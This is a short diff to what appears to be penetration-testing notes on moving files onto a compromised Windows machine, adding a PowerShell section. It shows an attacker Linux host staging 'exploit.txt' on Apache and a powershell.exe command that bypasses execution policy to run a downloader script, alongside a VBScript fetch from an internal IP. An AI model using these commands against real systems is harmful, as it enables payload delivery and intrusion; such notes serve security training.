@@ -52,3 +52,15 @@ cscript wget.vbs http://10.11.0.138/test.txt testvbs.txt
 ```
 
 ## Powershell
+More modern windows computers, allows bypass of execution policies
+
+Linux (attacker)
+```
+cp exploit.txt /var/www/exploit.txt
+service apache2 start
+```
+
+Windows (Defender) - Paste `wget-ps.txt` into the shell then use
+```
+powershell.exe -ExecutionPolicy Bypass -NoLogo -NonInteractive -NoProfile -File wget.ps1
+```
